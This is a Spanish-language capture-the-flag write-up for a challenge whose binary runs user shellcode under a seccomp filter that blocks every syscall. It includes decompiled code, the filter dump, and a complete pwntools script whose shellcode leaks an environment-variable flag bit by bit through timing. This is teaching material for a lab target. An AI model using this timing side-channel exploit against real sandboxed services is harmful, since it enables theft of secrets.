# Saving The Environment

Este ejercicio nos da un programa que imprime las variables de entorno del usuario que lo ejecute.\
El usuario que ejecuta el binario en remoto tiene la variable `FLAG=laflag`, donde está la flag que queremos conseguir. Parece que simplemente hay que ejecutar el programa y ya, pero si lo hacemos, donde debería aparecer la flag, saldrá `FLAG=... Lets not print this one...`.  Esto se debe a lo siguiente:

El programa hace el siguiente bucle:

```c
found_flag = false;
for (i = 0; envp[i] != (char *)0x0; i = i + 1) {
    check = strncmp(envp[i],"FLAG=",5);
    if (check == 0) {
        puts("FLAG=... Lets not print this one...");
        found_flag = true;
    }
    else {
        puts(envp[i]);
    }
}
if (!found_flag) {
    puts("Error: FLAG not found in environment variables");
    exit(1);
}
```

Comprueba cada línea que se imprime y, si contiene `FLAG=`, muestra otro texto en su lugar.

Si nos fijamos en cómo funciona el programa, podemos ver que, después de imprimir las variables, nos pide 2 inputs:

```c
puts("Environment Variables:");
print_env(envp);

code_len = 0;
__isoc99_scanf("%u", &code_len);

if (0x200 < code_len) {
    puts("You'd like uh");
    exit(1);
}
```

Primero nos pide un tamaño.

```c
read(0, code_buffer, (ulong)code_len);
```

Después, nos pide el contenido. Y si miramos más atrás:

```c
code_buffer = (byte *)mmap((void *)0x500000,0x200,7,0x22,-1,0);
```

La zona donde se guarda es una región de memoria con permisos de ejecución.

Aún por encima, el programa ejecuta el código de esa zona:

```c
(*(code *)code_buffer)(0,0,0,0,0,0);
```

Parece que, como tenemos el control, podemos simplemente hacer un ret2syscall. Pero el programa hace lo siguiente:

```c
seccomp_filter = seccomp_init(0);
seccomp_rule_add(seccomp_filter,0,1,0);
seccomp_rule_add(seccomp_filter,0,0,0);
seccomp_load(seccomp_filter);
seccomp_release(seccomp_filter);
```

Estos son filtros **seccomp** que limitan lo que se puede llamar. En este caso, usando la herramienta [Seccomp Tools](https://github.com/david942j/seccomp-tools) podemos ver que **todas las syscalls están bloqueadas**:

```c
line  CODE  JT  JF  K
=================================
0000: 0x20  0x00 0x00 0x00000004 A = arch
0001: 0x15  0x00 0x03 0xc000003e if (A != ARCH_X86_64) goto 0005
0002: 0x20  0x00 0x00 0x00000000 A = sys_number
0003: 0x35  0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
0004: 0x15  0x00 0x00 0xffffffff /* no-op */
0005: 0x06  0x00 0x00 0x00000000 return KILL
```

Como el programa ejecuta nuestro shellcode pero no podemos hacer ninguna syscall, la idea es **crear un ataque basado en tiempo** para filtrar bit a bit la flag usando condicionales y bucles.

Para esto necesitamos saber la dirección en memoria de la flag.\
Sabemos que en remoto la flag está en la línea 5 de las variables de entorno. Si conseguimos hacer un leak de esa misma línea en local (aunque no sea la flag real), podremos calcular el offset necesario para acceder a ella en remoto. Con GDB se puede obtener ese offset comparando con `rbp`.

El resto es implementar un shellcode que lea cada byte y nos permita reconstruir la flag caracter a caracter.

```python
#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./chall")

context.binary = exe
context.terminal = ["kitty"]
context.log_level = 'error'
gdbscript = """
b *0x401471
c
"""

def get_bit(offset, bit):
    p = process(exe.path)
    #p = gdb.debug(exe.path, gdbscript)

    shellcode = asm(f'''
        mov rdi, [rbp + 0x150]
        xor rax, rax
        xor rbx, rbx

        mov al, byte ptr [rdi + {offset}]
        mov bl, {1 << bit}
        and al, bl

        imul rax, 0x20000000
    loop_start:
        cmp rax, r11
        je loop_finished
        inc r11
        imul ebx, 0x13
        jmp loop_start
    loop_finished:
        syscall
    ''', arch='amd64')
    
    p.recv(timeout=0.2)
    p.sendline(str(len(shellcode)).encode())
    p.send(shellcode)
    start_time = time.time()

    try:
        p.recvall(timeout=2)
    except EOFError:
        pass
    now = time.time()
    diff = now - start_time
    print(diff)

    if diff > 0.5:
        return 1
    else:
        return 0

flag = ''
offset = 0
while '}' not in flag:
    bits = []
    for i in range(8):
        bits.append(get_bit(offset, i))

    byte_completo = 0
    for bit in reversed(bits):
        byte_completo = (byte_completo << 1) | bit

    flag += chr(byte_completo)
    print(f"Flag parcial: {flag}")
    offset += 1

print(f"Flag final: {flag}")
```

```bash
$ python3 solve.py
Flag parcial: s
Flag parcial: sn
Flag parcial: sna
Flag parcial: snak
Flag parcial: snake
. . .
Flag final: snakeCTF{SECRET}
```
